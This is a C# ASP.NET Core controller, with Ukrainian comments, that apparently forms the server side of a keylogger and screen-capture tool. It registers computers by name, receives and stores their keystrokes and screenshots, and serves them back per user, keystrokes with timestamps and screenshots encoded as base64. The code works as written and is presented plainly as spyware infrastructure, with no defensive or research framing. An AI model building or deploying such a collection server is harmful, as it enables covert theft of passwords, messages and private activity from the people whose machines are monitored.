using ListenerDatabase; // Простір імен для AppDbContext
using ListenerDatabase.Models; // Простір імен для моделей User, KeyLog, Screenshot
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System.IO;
using System.Threading.Tasks;

namespace ListenerServer
{
    [ApiController]
    [Route("api")]
    public class DataController : ControllerBase
    {
        private readonly AppDbContext _context;

        public DataController(AppDbContext context)
        {
            _context = context;
        }

        [HttpPost("register-computer")]
        public async Task<IActionResult> RegisterComputer(string computerName)
        {
            var user = await _context.Users.FirstOrDefaultAsync(u => u.ComputerName == computerName);
            if (user == null)
            {
                user = new User { ComputerName = computerName };
                _context.Users.Add(user);
                await _context.SaveChangesAsync();
            }

            return Ok(new { UserId = user.UserId });
        }

        [HttpPost("save-keypress")]
        public async Task<IActionResult> SaveKeyPress([FromForm] string computerName, [FromForm] string keyPressed)
        {
            var user = await _context.Users.FirstOrDefaultAsync(u => u.ComputerName == computerName);
            if (user == null)
                return BadRequest("Користувач не зареєстрований.");

            var keyLog = new KeyLog
            {
                KeyPressed = keyPressed,
                Timestamp = DateTime.Now,
                UserId = user.UserId
            };

            _context.KeyLogs.Add(keyLog);
            await _context.SaveChangesAsync();

            return Ok("Клавіша збережена.");
        }

        [HttpPost("save-screenshot")]
        public async Task<IActionResult> SaveScreenshot([FromForm] string computerName, [FromForm] IFormFile screenshotFile)
        {
            var user = await _context.Users.FirstOrDefaultAsync(u => u.ComputerName == computerName);
            if (user == null)
                return BadRequest("Користувач не зареєстрований.");

            using var memoryStream = new MemoryStream();
            await screenshotFile.CopyToAsync(memoryStream);

            var screenshot = new Screenshot
            {
                ImageData = memoryStream.ToArray(),
                Timestamp = DateTime.Now,
                UserId = user.UserId
            };

            _context.Screenshots.Add(screenshot);
            await _context.SaveChangesAsync();

            return Ok("Скріншот збережений.");
        }

        [HttpGet("get-keypresses")]
        public async Task<IActionResult> GetKeyPresses(int userId)
        {
            var user = await _context.Users.Include(u => u.KeyLogs).FirstOrDefaultAsync(u => u.UserId == userId);
            if (user == null)
                return NotFound("Користувач не знайдений.");

            var keyLogs = user.KeyLogs.Select(k => new
            {
                k.Timestamp,
                k.KeyPressed
            });

            return Ok(keyLogs);
        }

        [HttpGet("get-screenshots")]
        public async Task<IActionResult> GetScreenshots(int userId)
        {
            var user = await _context.Users.Include(u => u.Screenshots).FirstOrDefaultAsync(u => u.UserId == userId);
            if (user == null)
                return NotFound("Користувач не знайдений.");

            var screenshots = user.Screenshots.Select(s => new
            {
                s.Timestamp,
                ImageData = Convert.ToBase64String(s.ImageData)
            });

            return Ok(screenshots);
        }

    }
}
